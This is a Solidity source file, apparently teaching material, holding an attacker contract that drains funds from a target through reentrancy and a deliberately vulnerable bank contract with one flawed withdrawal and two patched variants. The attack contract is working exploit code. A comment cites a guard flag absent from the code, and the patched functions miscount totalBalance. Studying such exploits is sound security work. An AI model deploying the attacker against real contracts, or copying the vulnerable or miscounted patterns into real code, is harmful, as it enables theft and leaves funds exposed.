pragma solidity ^0.4.25;

contract hacker {
    
    address owner;
    address target;
    
    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }
    
    constructor(address _target) public {
        owner = msg.sender;
        target = _target;
    }
    
    function callAddToBalance() public payable {
        target.call.value(msg.value)(bytes4(keccak256("addToBalance()")));
    }
    
    function launch_attack() public{
        // call withdrawBalance
        // withdrawBalance calls the fallback of ReentranceExploit
        target.call(bytes4(keccak256("withdrawBalance()")));
    }  


    function () public payable{
        // atackModeIsOn is used to execute the attack only once
        // otherwise there is a loop between withdrawBalance and the fallback function
        target.call(bytes4(keccak256("withdrawBalance()")));
    }
    
    function getMoney() public onlyOwner {
        selfdestruct(owner);
    }
}

contract Reentrance {
    
    uint public totalBalance;
    mapping (address => uint) userBalance;
   
    function getBalance(address u) public constant returns(uint){
        return userBalance[u];
    }

    function addToBalance() public payable{
        userBalance[msg.sender] += msg.value;
        totalBalance += msg.value;
    }   

    function withdrawBalance() public {
        // send userBalance[msg.sender] ethers to msg.sender
        // if mgs.sender is a contract, it will call its fallback function
        if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){
            revert();
        }
        userBalance[msg.sender] = 0;
        totalBalance -= userBalance[msg.sender];
    }   

    function withdrawBalance_fixed() public {
        // to protect against re-entrancy, the state variable
        // has to be change before the call
        uint amount = userBalance[msg.sender];
        userBalance[msg.sender] = 0;
        totalBalance -= userBalance[msg.sender];
        if( ! (msg.sender.call.value(amount)() ) ){
            revert();
        }
    }   

    function withdrawBalance_fixed_2() public {
        // send() and transfer() are safe against reentrancy
        // they do not transfer the remaining gas
        // and they give just enough gas to execute few instructions    
        // in the fallback function (no further call possible)
        msg.sender.transfer(userBalance[msg.sender]);
        userBalance[msg.sender] = 0;
        totalBalance -= userBalance[msg.sender];
    }
    
    function contractBalance() public view returns(uint) {
        return address(this).balance;
    }
   
}